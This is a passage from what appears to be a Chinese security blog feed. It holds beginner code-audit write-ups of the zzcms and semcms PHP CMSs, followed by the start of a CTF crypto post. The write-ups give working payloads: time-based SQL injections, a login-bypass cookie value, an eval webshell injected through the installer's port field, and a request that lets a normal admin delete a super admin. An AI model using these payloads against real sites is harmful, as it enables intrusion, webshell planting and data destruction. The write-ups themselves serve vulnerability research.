src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><blockquote><p>来到ask/search.php 页面 这里定义了一个$fp 引入了一个模板 然后通过$f用fopen函数用只读的方式打开ask_search.htm</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><blockquote><p>然后通过fread函数来读取<br>fread() 函数读取文件（可安全用于二进制文件）。</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><blockquote><p>然后期间经过了一些str_replace函数的过滤 在232行 调用的showlabel函数<br>我们跟进这个函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><blockquote><p>通过foreach函数遍历channels数组 经过测试 最后都会进入到if里面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><blockquote><p>在if函数中又调用了fixed函数 我们继续跟进</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><blockquote><p>Fixed函数通过switch 根据传进来的channels值 分别调用函数 通过前面知道channels数组的第一个的ad 所以会进入ad 调用 showed函数 继续跟进showad</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><blockquote><p>Showad函数 会将传进去的内容先用explode函数进行分割 如果匹配不到分割的参数 则会返回整个$cs 是一个数组<br>所以后面$b就有值了 $s就为空<br>继续看后面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><blockquote><p>这里发现sql语句 肯定想到的是sql注入 所以我们要想办法让代码进入这里面执行 sql语句在else里面 我们看看if</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><blockquote><p>If里面的条件都是通过&amp;&amp; 拼接 所以我们只需要让一个不为true 就进入else<br>继续看 发现里面有一个filesize($fp)&gt;10的判断 然后我们往上看$fp<br>$Fp是通过一系列的拼接 其中就有$b 最后拼接成htm<br>这个$b从前面可知是我们可以控制的 所以最后拼接出来的htm只要不存在 if的条件就不成立 就进入了else 执行sql</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><blockquote><p>后面调用了query函数 我们跟进query函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><blockquote><p>是没有任何防护的（这里说错了 其实是有sql注入防护的  因为这里的数据是通过文件读取的 所以过滤函数没有起作用   后面会有介绍）<br>Sql测试</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><blockquote><p>来到后台 添加一个模板ask_search.htm<br>内容 <br>然后保存 然后访问 ask/search.php</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><blockquote><p>延时成功<br>我在测试这里的时候当时遇到了一个小问题 开始一直不能延时 后来才发现是zzcms_ad<br>这个表的原因</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><blockquote><p>Zzcms_ad 这个表不能为空 空的话 就无法延时</p></blockquote><h3 id="第二处代码执行："><a href="#第二处代码执行：" class="headerlink" title="第二处代码执行："></a>第二处代码执行：</h3><blockquote><p>在install/index.php的114行</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><blockquote><p>用fopen函数 写入的方式打开了文件<br>用fputs函数写入文件<br>fputs() 函数写入文件（可安全用于二进制文件）</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><blockquote><p>然后在step_2.php 以及 345文件中都没有发现判断是否又install.lock这个文件</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><blockquote><p>在install/index.php页面又是通过$step来包含这些页面的 然后我们看看这个$step是怎么传入的</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><blockquote><p>自己通过post的方式传入 也没有任何防护 所以我们可以直接通过post的方式构造step=2 直接来到安装步骤的第二步<br>测试<br>现进入install/index.php页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><blockquote><p>然后打开hackbar</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><blockquote><p>这里有个疑惑 不知道为什么抓包改请求方式的办法 一直用不起 页面一直显示空白</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><blockquote><p>一直下一步 来到这里</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><blockquote><p>通过这里可以知道 创建数据库这一步的这些数据 会写入到另一个文件config.php</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><blockquote><p>并且写入的时候 没有什么过滤 说明 写入的参数是可控的 在这里可以直接尝试写入一句话<br>在端口的位置输入3306’);eval($_POST[‘a’]);(‘</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><blockquote><p>然后下一步</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><blockquote><p>然后查看config.php</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><blockquote><p>成功写入</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><blockquote><p>可getshell</p></blockquote><h3 id="第三处越权"><a href="#第三处越权" class="headerlink" title="第三处越权"></a>第三处越权</h3><blockquote><p>来到tag.php页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><blockquote><p>现查出所有的表 然后和 cookie中的tablename的值进行比对<br>str_is_inarr跟进这个函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><blockquote><p>然后通过in_arr函数进行比对<br>in_array() 函数搜索数组中是否存在指定的值。<br>通过前面可知$tablenames 后面拼接了# 所以能够进入到if被然后被explode函数拆分 然后进入if 返回yes</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/32.png" alt="32"></p><blockquote><p>返回yes之后 就会执行下面的代码 然后根据dowhat 的值执行switch<br>前面两个看参数就知道 一个是增加 一个是修改 我们看第三个函数showtag()<br>跟进函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/33.png" alt="33"></p><blockquote><p>上面根据action参数 获取判断是px 或者是del<br>通过代码分析px 没有没什么可利用的 下面的del 有可控制的点</p></blockquote><blockquote><p>我们可以控制tablename和id 来控制删除数据<br>相当于这里就是通过cookie里面传的表 以及post传的id值 进行查询表的数据和id进行匹配 匹配到了 就直接删除 没有其他的限制<br>测试</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/34.png" alt="34"></p><blockquote><p>现在后台添加一个普通管理员ttt和一个超级管理员asd</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/35.png" alt="35"></p><blockquote><p>然后登录普通管理员</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/36.png" alt="36"></p><blockquote><p>然后访问tag.php  进行抓包</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/37.png" alt="37"></p><blockquote><p>改包之后进行放包</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/38.png" alt="38"></p><blockquote><p>asd超级管理员成功被ttt普通管理员删除</p></blockquote><blockquote><p>同理 也可以删除其他表的数据 只要表明 和id能匹配上</p></blockquote><h3 id="第四处sql"><a href="#第四处sql" class="headerlink" title="第四处sql"></a>第四处sql</h3><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/39.png" alt="39"></p><blockquote><p>来到bad.php页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/40.png" alt="40"></p><blockquote><p>下面有sql语句<br>在in 后面的 $id 没有引号保护 可能被利用</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/41.png" alt="41"></p><blockquote><p>先来到bad.php页面 在数据库随便添加的数据<br>然后分析代码</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/42.png" alt="42"></p><blockquote><p>通过post传入id 然后action=del 进入到sql执行里面 如果id后面有逗号 则执行if<br>有则else 看看下面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/43.png" alt="43"></p><blockquote><p>执行sql的函数 我们跟进这个函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/44.png" alt="44"></p><blockquote><p>这个函数在conn.php里面 而conn.php还包含了其他文件</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/45.png" alt="45"></p><blockquote><p>注意到stopsqlin.php 打开这个文件看看</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/46.png" alt="46"></p><blockquote><p>这个文件主要是过滤的<br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。<br>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。<br>相当于这里单引号双引号都过滤了<br>但是 有个地方没有引号保护 直接尝试payload：</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/47.png" alt="47"></p><blockquote><p>点击删除 然后抓包</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/48.png" alt="48"></p><blockquote><p>构造payload：id[]=1,1)+or sleep(5)#&amp;del=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF&amp;pagename=showbad.php%3Fpage%3D&amp;tablename=zzcms_bad</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/49.png" alt="49"></p><blockquote><p>成功延时</p></blockquote><blockquote><p>但是这个sql也是要登录后台的</p></blockquote><h3 id="第五处sql"><a href="#第五处sql" class="headerlink" title="第五处sql"></a>第五处sql</h3><blockquote><p>因为前面的sql需要登录后台 所以想找个不需要登录的<br>前面找到没有引号保护的sql 这个cms肯定不止一个地方 全局搜索</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/50.png" alt="50"></p><blockquote><p>在dl/dl_print.php 文件下找到</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/51.png" alt="51"></p><blockquote><p>这个文件在开始也没有检验是否登录 所以有戏 接着分析源码</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/52.png" alt="52"></p><blockquote><p>通过cookie是否有username 来判断是否执行OpenAndDataFunc这个函数 这个函数是弹出登录框的</p></blockquote><blockquote><p>往后看</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/53.png" alt="53"></p><blockquote><p>id还是通过post传入</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/54.png" alt="54"></p><blockquote><p>这里有个权限的判断 我们跟进这个函数</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/55.png" alt="55"></p><blockquote><p>这个函数是判断cookie中的uesname是否在zzcms_user表中 有则返回yes<br>这里这个username 是可以通过枚举来判断这个表里有哪一些</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/56.png" alt="56"></p><blockquote><p>然后就看到这里 和前面的差不多 但这里两个sql语句都没有引号保护 说明 都可以达到注入<br>尝试测试</p></blockquote><blockquote><p>先打开dl/dl_print.php 页面</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/57.png" alt="57"></p><blockquote><p>然后刷新抓包</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/58.png" alt="58"></p><blockquote><p>然后右键改包 构造payload：id[]=2+or sleep(5)#</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/59.png" alt="59"></p><blockquote><p>还有一种</p></blockquote><p><img src="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/60.png" alt="60"></p><blockquote><p>都可以延时</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>semcms审计</title>
    <link href="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>刚开始学审计 也是看了社区们师傅的文章<a href="https://forum.butian.net/share/387">https://forum.butian.net/share/387</a><br>可能是自己太菜了 感觉不太详细 就自己审了一下</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><blockquote><p>先打开cms 简单浏览一下</p></blockquote><h2 id><a href="#" class="headerlink" title></a><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/0.png" alt="0"></h2><blockquote><p><em>看起来视乎是个商城一样的网站 不管随便点点 然后来到代码</em></p></blockquote><h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><blockquote><p>然后看到index.php文件，发现里面用include_once 包含了3个文件</p></blockquote><blockquote><p><em>include_once() 语句是指在脚本执行期间包含并运行指定文件。</em><br><em>此行为和 include() 语句类似，唯一区别是如果该文件中的代码已经被包含了，则不会再次包含。如同此语句名字暗示的那样，只会包含一次</em></p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/1.png" alt="1"></p><blockquote><p><strong>然后打开web_inc.php 看看这个文件里面有什么</strong></p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/2.png" alt="2"></p><blockquote><p>这个文件开始是一个ob_start() 函数<br>因为第一次审 所以不懂什么意思 百度了一下发现是打开缓冲区<br>但这里暂时不管它 这个文件里面也用到了include_once 函数包含了2个文件 但暂时都不管<br>继续往下看<br>在53行的时候发现了一串代码</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/3.png" alt="3"></p><blockquote><p><em>$web_urls接收了$_SERVER[“REQUEST_URI”]值然后通过explode函数分割后传入web_language_ml函数中</em><br><em>$_SERVER[“REQUEST_URI”]函数是返回当前的url路径 我们通过</em><br><em>var_dump来查看返回值</em></p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/4.png" alt="4"></p><blockquote><p>保存之后来到index.php文件下查看</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/5.png" alt="5"></p><blockquote><p>explode(separator,string,limit)函数是把获取到的url路径通过 / 分割为数组，第一个参数是根据什么进行分割，第二个参数是需要分割的字符串</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/6.png" alt="6"></p><blockquote><p>然后看下面的web_language_ml函数 通过将$web_urls中的[1]<a href="https://forum.butian.net/share/%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99web_urls%E4%BB%A5%E5%8F%8A%E8%A2%AB%E5%88%86%E5%89%B2%E4%B8%BA%E6%95%B0%E7%BB%84%E4%BA%86">2</a> 传到了函数中 以及$db-conn<br>$db-conn则是最开是include_once 包含进来的数据库连接对象</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/7.png" alt="7"></p><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/8.png" alt="8"></p><blockquote><p>继续跟进web_language_ml函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/9.png" alt="9"></p><blockquote><p>发现该函数没有任何的过滤操作 直接就把传过来的值 进行了数据库查询操作 很明显存在sql注入 根据代码发现是单引号闭合 直接注就行了</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/10.png" alt="10"></p><blockquote><p>这个洞有个前提 就是文件必须解压在根目录下才行 如果套了一层目录的话 就不能成功</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/11.png" alt="11"></p><blockquote><p>因为分割后的数组内容就变了 添加其他的内容就没用了</p></blockquote><h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><blockquote><p>后面发现在后台登录的时候会经过SEMCMS_Top_include.php 判断<br>然后跟进文件</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/12.png" alt="12"></p><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/13.png" alt="13"></p><blockquote><p>发现有一个checkuser函数 从函数的命名上就可以看出 肯定和登录相关 然后跟进checkuser()函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/14.png" alt="14"></p><blockquote><p>发现是通过cookie传值的方法 然后进行数据库查询 判断用户是否登录<br>这里还有两个函数test_input(),和verify_str()函数<br>不知道这两函数的作用 大概猜测是过滤<br>然后跟进函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/15.png" alt="15"></p><blockquote><p>Test_input函数接收数据，然后通过str_replace函数将结束数据中的% 替换为percent<br>然后通过trim函数去掉首位的空格，stripslashes函数删去数据中的反斜杠(只去掉一个反斜杠)，htmlspecialchars() 函数把双引号和单引号转为 HTML 实体。 然后返回过滤之后的数据<br>跟进verify_str函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/16.png" alt="16"></p><blockquote><p>verify_str()函数接受参数然后利用if判断 将参数传给inject_check_sql函数<br>继续跟进inject_check_sql函数</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/17.png" alt="17"></p><blockquote><p>inject_check_sql函数接受参数 然后通过 正则匹配 ，返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，<br>如果匹配到了就会返回1就会进去前面的if判断 执行报错<br>所以还是过滤了很多相关的关键词 这里没有规定大小写 所以可以用大小写绕过<br>然后尝试绕过payload：</p><p><em>scuseradmin:aaa/</em><br><em>scuserpass:or 1#</em></p></blockquote><blockquote><p>然后放到sql执行的语句就是</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/18.png" alt="18"></p><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/19.png" alt="19"></p><blockquote><p>能查出数据 所以函数执行返回的行数是大于0的，所以就会进去if判断</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/20.png" alt="20"></p><blockquote><p>然后利用mysqli_fetch_assoc函数接收结果 并把user_qx返回<br>然后验证 但是发现了bug 不知道是本地环境还是怎么回事 就是进不去页面 但是没报错</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/21.png" alt="21"></p><blockquote><p>然后我换成延时试试</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/22.png" alt="22"></p><blockquote><p>延时sql是成功执行的 上面第一次没进去 就很奇怪 讲道理这里应该是能绕过登录直接进去才对 我就是进不去</p></blockquote><h3 id="第三处"><a href="#第三处" class="headerlink" title="第三处"></a>第三处</h3><blockquote><p>在web_inc.php的91行发现了一个sql查询语句 发现了一个language参数 是传过来的<br>跟进看看 怎么来的</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/23.png" alt="23"></p><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/24.png" alt="24"></p><blockquote><p>前面太多花里胡哨的 就先不看 直接看if if里面的意思是 如果存在post的传参languageID的话 就进去if判断 然后进行过滤返回 过滤函数和前面一样 那就看前面就好了<br>然后写上echo 进行调试看看 因为很多页面都引用了web_inc.php这个文件 就不一一查找了 直接先访问首页看看 好家伙 直接打印了</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/25.png" alt="25"></p><blockquote><p>好 接下来试试post 用bp抓包 这里有个小问题 因为搭建在本地的 如果url是127.0.0.1会抓不到包 我的解决方式是把127.0.0.1 换成ipv4的值 然后就可以抓包了<br>然后来到主页 刷新抓包 然后用bp改包</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/26.png" alt="26"></p><blockquote><p>点击就改成post包，然后在下面加上languageID 然后放包</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/27.png" alt="27"></p><blockquote><p>开始注入</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/28.png" alt="28"></p><blockquote><p>成功延时<br>继续看其他的</p></blockquote><h3 id="第四处"><a href="#第四处" class="headerlink" title="第四处"></a>第四处</h3><blockquote><p>在SEMCMS_Banner.php发现了sql语句<br>在SEMCMS_Banner.php的74行 这行sql语句没用任何参数过滤</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/29.png" alt="29"></p><blockquote><p>然后上面的代码逻辑是判断type</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/30.png" alt="30"></p><blockquote><p>先判断add和edit 然后才else进到下面</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/31.png" alt="31"></p><blockquote><p>因为这里没看见上面过滤 就直接构造payload：</p><p><em>/SEMCMS_PHP_3.9/vyT4nP_Admin/SEMCMS_Banner.php?lgid=1+and+sleep(5)#</em></p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/32.png" alt="32"></p><blockquote><p>延时成功<br>但是在尝试select的时候却出现了问题</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/33.png" alt="33"></p><blockquote><p>直接报错了 这个报错信息是前面解释过的过滤函数中的一个 但是这里没有看见使用该函数进行过滤呀 这里有点懵 这个文件虽然包含了</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/34.png" alt="34"></p><blockquote><p>这个php文件是用来判断是否登录的 因为前面发现可以通过sql 绕过登录 使用banner.php也是直接进来了 但是过滤我真没找到 应该是我太菜了 毕竟都报错了<br>那就只能通过大小写登方式来绕过过滤 但是当我尝试的时候 发现不行 windows不区分大小写 难道是因为这样嘛 有点小懵 看来还是只能通过其他的方式注入 用其他的替换过滤掉的关键词<br>这处注入是简历在第二处注入绕过登录的前提下 因为这个页面相当于是后台的页面</p></blockquote><h3 id="第五处"><a href="#第五处" class="headerlink" title="第五处"></a>第五处</h3><blockquote><p>其实这处也不算啥 登录出可以爆破 因为没有验证码的限制 可以直接跑字典<br>直接来到后台页面</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/35.png" alt="35"></p><blockquote><p>然后抓到包直接丢爆破模块里面</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/36.png" alt="36"></p><blockquote><p>就可以开始爆破了</p></blockquote><p><img src="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/37.png" alt="37"></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><blockquote><p>小白第一次审计 还有很多不会 也看了很多文章 查了很多函数 师傅们轻点喷 有什么不足的地方提个建议 我学习学习 这cms还在看 感觉应该还有洞 虽然没能找到直接拿shell的洞 通过这些 也学到了不少审计的思路</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-crypto1</title>
    <link href="/2021/09/26/ctf-crypto1/"/>
    <url>/2021/09/26/ctf-crypto1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一次巧合的情况下点开了一个ctf比赛 一直没玩过ctf 第一次  0基础分析 签到题<br>crypto的</p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br>flag=<span class="hljs-string">b&#x27;flag&#123;******************&#125;&#x27;</span><br>n = <span class="hljs-number">2</span> ** <span class="hljs-number">256</span><br>flaglong=bytes_to_long(flag)<br>m = random.randint(<span class="hljs-number">2</span>, n-<span class="hljs-number">1</span>) | <span class="hljs-number">1</span><br>c = <span class="hljs-built_in">pow</span>(m, flaglong, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;m = &#x27;</span> + <span 